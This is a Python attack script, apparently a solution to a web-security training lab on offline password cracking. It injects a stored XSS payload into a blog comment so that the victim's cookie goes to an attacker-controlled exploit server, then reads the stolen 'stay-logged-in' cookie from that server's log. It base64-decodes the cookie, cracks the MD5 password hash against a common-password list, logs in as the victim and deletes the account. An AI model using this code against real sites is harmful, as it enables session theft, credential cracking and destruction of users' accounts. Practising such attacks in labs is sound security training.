import requests
import sys
import urllib3
import re
import bs4
import base64
import hashlib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

password=password=['123456\n', 'password\n', '12345678\n', 'qwerty\n', '123456789\n', '12345\n', '1234\n', '111111\n',
'1234567\n', 'dragon\n', '123123\n', 'baseball\n', 'abc123\n', 'football\n', 'monkey\n', 'letmein\n', 
'shadow\n', 'master\n', '666666\n', 'qwertyuiop\n', '123321\n', 'mustang\n', '1234567890\n', 'michael\n', 
'654321\n', 'superman\n', '1qaz2wsx\n', '7777777\n', '121212\n', '000000\n', 'qazwsx\n', '123qwe\n', 
'killer\n', 'trustno1\n', 'jordan\n', 'jennifer\n', 'zxcvbnm\n', 'asdfgh\n', 'hunter\n', 'buster\n', 
'soccer\n', 'harley\n', 'batman\n','andrew\n', 'tigger\n', 'onceuponatime\n','sunshine\n', 'iloveyou\n', '2000\n',
'charlie\n', 'robert\n', 'thomas\n', 'hockey\n', 'ranger\n', 'daniel\n', 'starwars\n', 'klaster\n', 
'112233\n', 'george\n', 'computer\n', 'michelle\n', 'jessica\n', 'pepper\n', '1111\n', 'zxcvbn\n',
'555555\n', '11111111\n', '131313\n', 'freedom\n', '777777\n', 'pass\n', 'maggie\n', '159753\n', 
'aaaaaa\n', 'ginger\n', 'princess\n', 'joshua\n', 'cheese\n', 'amanda\n', 'summer\n', 'love\n', 
'ashley\n', 'nicole\n', 'chelsea\n', 'biteme\n', 'matthew\n', 'access\n', 'yankees\n', '987654321\n', 'dallas\n',
'austin\n', 'thunder\n', 'taylor\n', 'matrix\n', 'mobilemail\n', 'mom\n', 'monitor\n', 'monitoring\n', 
'montana\n', 'moon\n', 'moscow']

proxie={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

#Lab: Offline password cracking

#get exploite server link
""" <a id='exploit-link' class='button' target='_blank'
 href='https://exploit-xxxxxxxxxxxxxxxxxxxxxxxxxxx.exploit-server.net'>Go to exploit server</a>"""

def exploit_server(session,url):
    response=session.get(url,verify=False)
    soup=bs4.BeautifulSoup(response.text,"html.parser")
    link=str(soup.find("a"))
    return str(link.split(" ")[2].split('"')[1])

#####
def delete_user(password,url):
    login_url=url+"/login"
    url_delete=url+"/my-account/delete"
    session=requests.session()
    data={"username":"carlos","password":password.strip()}
    login_response=session.post(login_url,data=data,verify=False,proxies=proxie)
    if "Log out" in login_response.text:
        print('(+) Login to carlos acount successfully ')
        print('(+) Deleting user carlos ....')
        data_delete={"password":password.strip()}
        delete_response=session.post(url_delete,verify=False,data=data_delete,proxies=proxie)
        if delete_response.status_code == 302:
            print('(+) user deleted successfully ')
            sys.exit(-1)
    



def md5_decode(hash,url):
    
    for ps in password:
        passwords_hash=hashlib.md5(ps.strip().encode())
        if passwords_hash.hexdigest() == hash:
            print('(+) password found : %s'%ps.strip())
            delete_user(ps,url)
            break
    


def get_cookie(session,url,serverExploit_link):

    link=serverExploit_link+"/log"
    response=session.get(link,verify=False,proxies=proxie)
    if "404" in response.text:
        print('(+) Extracting stay logged cookie ....')
        
        cookie=re.search("stay-logged-in=[a-zA-Z0-9]*",response.text).group().split("=")[1]
        print('(+) stay logged cookie found : %s '%cookie)
        print('(+) Decoding the cookie ....')
        base64_decode=base64.b64decode(cookie)
        base64_decode=base64_decode.decode("ascii")
        print("(+) base64 decoding : %s " %base64_decode)
        print('(+) Trying to break the md5 hash .....')
        md5_decode(str(base64_decode.split(":")[1]),url)

    else:
        print('(-) Error !')
        exit()
        
        
        
        
def offline_cracking(session,url,serverExploit_link):
    comment_url=url+"/post/comment"
    # post the xss payload to the comment section
    payload_xss=str('<script>document.location="%s/exploit"+document.cookie;</script>'%serverExploit_link)
    data={"postId":5,"comment":payload_xss,"name":"netflix","email":"test@emailaoa.pro","website":"http://hamu.com"}
    response=session.post(comment_url,verify=False,data=data,proxies=proxie)
    if response.status_code==200:
        print('(+) Comment Submited . ')
        get_cookie(session,url,serverExploit_link)
        


    
    
    

def main():
    if len(sys.argv) != 2:
        print('(+) Usage %s <url>'%sys.argv[0])
        print('(+) Example %s www.site.com'%sys.argv[0])
        sys.exit(-1)

    session=requests.session()
    url=sys.argv[1]
    link=exploit_server(session,url)
    offline_cracking(session,url,link)

if __name__=="__main__":
    main()














